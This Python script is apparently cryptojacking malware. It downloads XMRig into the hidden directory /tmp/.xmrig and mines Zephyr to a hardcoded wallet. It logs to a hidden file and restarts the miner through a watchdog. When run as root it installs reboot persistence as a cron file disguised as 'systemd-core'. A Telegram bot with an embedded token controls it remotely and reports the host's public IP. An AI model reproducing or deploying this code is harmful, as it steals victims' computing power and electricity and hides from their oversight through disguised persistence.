import os, subprocess, time, socket, threading, telebot, platform, requests

# ========== CONFIG ==========
BOT_TOKEN = '7987532893:AAGvwCj4X83Qr5IFYyk3GeO3synDYR5Xh4Y'
CHAT_ID = '7285391034'
POOL = 'fr.zephyr.herominers.com:1123'
WALLET = 'ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b'
THREADS = str(os.cpu_count() or 4)
COIN = 'zeph'
TLS = True
XMRIG_URL = 'https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-x64.tar.gz'
# ============================

bot = telebot.TeleBot(BOT_TOKEN)
worker_name = "default"
log_file = "/tmp/.miner.log"
xmrig_path = "/tmp/.xmrig"
xmrig_bin = os.path.join(xmrig_path, "xmrig")
watchdog_delay = 10
miner_proc = None

def get_ip():
    try:
        return requests.get("https://api.ipify.org").text.strip()
    except:
        return "N/A"

def download_xmrig():
    if os.path.exists(xmrig_bin):
        return
    os.makedirs(xmrig_path, exist_ok=True)
    os.system(f"curl -L {XMRIG_URL} -o /tmp/xmrig.tar.gz && tar -xzf /tmp/xmrig.tar.gz -C {xmrig_path} --strip-components=1")

def build_cmd():
    cmd = [
        xmrig_bin,
        "-o", POOL,
        "-u", f"{WALLET}.{worker_name}",
        "-p", "x",
        "--threads", THREADS,
        "--coin", COIN
    ]
    if TLS:
        cmd.append("--tls")
    return cmd

def start_miner():
    global miner_proc
    stop_miner()
    download_xmrig()
    with open(log_file, "w") as log:
        miner_proc = subprocess.Popen(build_cmd(), stdout=log, stderr=log)

def stop_miner():
    global miner_proc
    if miner_proc and miner_proc.poll() is None:
        miner_proc.terminate()
        time.sleep(1)
        if miner_proc.poll() is None:
            miner_proc.kill()
    miner_proc = None

def watchdog():
    while True:
        time.sleep(watchdog_delay)
        if miner_proc is None or miner_proc.poll() is not None:
            start_miner()
            bot.send_message(CHAT_ID, "⚠️ Miner auto-restarted (watchdog).")

def setup_persistence():
    if os.geteuid() != 0:
        return
    cron_path = "/etc/cron.d/systemd-core"
    with open(cron_path, "w") as f:
        f.write(f"@reboot root python3 {os.path.abspath(__file__)}\n")

def read_hashrate():
    try:
        with open(log_file) as f:
            lines = f.readlines()
            for line in reversed(lines):
                if "speed" in line and "h/s" in line:
                    return line.strip()
    except:
        pass
    return "No hashrate found."

def read_log(n=20):
    try:
        with open(log_file) as f:
            return "\n".join(f.readlines()[-n:])
    except:
        return "No log."

def system_status():
    uptime = subprocess.getoutput("uptime -p")
    return (
        f"💠 Status\n"
        f"Miner: {'Running' if miner_proc and miner_proc.poll() is None else 'Stopped'}\n"
        f"IP: {get_ip()}\n"
        f"Uptime: {uptime}\n"
        f"Worker: {worker_name}\n"
        f"Threads: {THREADS}\n"
        f"Pool: {POOL}"
    )

# === TELEGRAM COMMANDS ===

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    bot.send_message(CHAT_ID, "✅ Starting miner.")
    start_miner()

@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    bot.send_message(CHAT_ID, "⛔ Stopping miner.")
    stop_miner()

@bot.message_handler(commands=["status"])
def cmd_status(msg):
    bot.send_message(CHAT_ID, system_status())

@bot.message_handler(commands=["speed"])
def cmd_speed(msg):
    bot.send_message(CHAT_ID, f"⚡ {read_hashrate()}")

@bot.message_handler(commands=["log"])
def cmd_log(msg):
    bot.send_message(CHAT_ID, f"📄 Last log lines:\n{read_log()}")

@bot.message_handler(commands=["setname"])
def cmd_setname(msg):
    global worker_name
    parts = msg.text.split()
    if len(parts) != 2:
        bot.send_message(CHAT_ID, "Usage: /setname <worker>")
        return
    worker_name = parts[1]
    bot.send_message(CHAT_ID, f"✅ Worker name set to {worker_name}")
    start_miner()

def bootstrap():
    setup_persistence()
    threading.Thread(target=watchdog, daemon=True).start()
    bot.send_message(CHAT_ID, "🚀 Miner controller started.")
    bot.infinity_polling()

if __name__ == "__main__":
    bootstrap()
